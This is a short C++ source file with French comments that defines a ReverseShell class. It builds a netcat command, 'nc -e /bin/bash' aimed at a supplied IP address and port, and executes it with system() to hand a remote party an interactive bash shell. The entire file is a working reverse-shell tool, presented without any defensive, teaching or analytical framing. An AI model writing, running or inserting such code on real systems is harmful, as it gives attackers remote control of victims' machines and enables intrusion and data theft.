#include "reverse_shell.h"

#include <cstdlib>
#include <iostream>

ReverseShell::ReverseShell(const std::string &ip, int port)
    : ipAddress(ip), port(port) {}

// Construit la commande Netcat pour lancer le reverse shell
std::string ReverseShell::getCommand() const {
    return "nc -e /bin/bash " + ipAddress + " " + std::to_string(port);
}

// Lance le reverse shell
bool ReverseShell::launch() {
    std::string command = getCommand();

    std::cout << "Execute la commande : " << command << std::endl;
    int ret = system(command.c_str());
    return (ret == 0);
}
